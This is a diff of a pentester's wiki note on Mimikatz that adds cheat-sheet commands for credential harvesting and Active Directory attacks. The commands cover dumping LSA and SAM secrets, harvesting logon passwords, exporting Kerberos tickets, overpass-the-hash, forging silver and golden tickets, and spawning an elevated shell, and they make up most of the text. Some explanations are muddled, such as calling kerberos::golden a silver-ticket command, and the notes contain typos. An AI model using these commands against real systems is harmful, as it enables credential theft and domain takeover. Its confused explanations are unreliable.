@@ -1,6 +1,7 @@
 # Mimikatz
+Used in Post Privilege Esculation in maintaining [[Persistence]] through credential harvesting and [[Active-Directory-Lateral-Movement]]
 
-```c
+```powershell
 privilege::debugv # enables the _SeDebugPrivilge_ access right
 token::elevate # elevate the security token Administrator -> SYSTEM
 lsadump::lsa /patch
@@ -10,25 +11,42 @@ sekurlsa::logonPasswords
 
 ### lsadumping
 
-```c
+```powershell
 privilege::debug
 lsadump::lsa /patch
 lsadump::sam # Dump SAM database
 ```
 
+## Kerberos Attacks
+Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Defined]]. It is credential base so understanding [[Active-Directory-Authenication]] in part for  [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.
+
 ### Kerberos Tickets
-```c
+```powershell
 kerberos::list /export
 ```
 
-### Golden Ticket Attacks
-Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos  [[Active-Directory-Kerberos-Defined]]
-```c
+### Overpass the Hash Attacks
+```powershell
+sekurlsa::logonpasswords # Or another NTLM obtaining method
+sekurlsa::pth /user:$admin /domain:$domain.com /ntlm:$NThash /run:Powershell.exe
+```
+
+### Silver Ticket Attacks
+Don't be confused `kerberos::golden` is for Silver Ticket Attacks, see Golden Ticket Attacks. Requires:# Username, Domainame, SID of Domain defined by all except the ultimate `-0000`, Service to target, Service type(eg. HTTP), password hahsh of the Service Account. Creating a service ticket for the SPN HTTP/WebServer.Domain.com with this technique from perspective of application the current user will be built-in local administrator and Domain Admin group member.
+```powershell
+kerberos::purge
+kerberos::list
+
+kerberos::golden /user:$user /domain:$domain.com /sid:$SID-minus-exception /target:$TargetServer.$domain.com /service:$servicetype /rc4:$passwordhash-of-spn /ptt # /ptt means injected directly into memory
+```
+
+### Golden Ticket Attacks 
+Don't be confused `kerberos::golden` is for Silver Ticket Attacks
+```powershell
 privilege::debug
 lsadump::lsa /inject /name:krbtgt
 ```
 
 Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
-like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`,then  
-open command prompt with elevated privileges `misc::cmd`.
+like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`,then  open command prompt with elevated privileges `misc::cmd`.
 
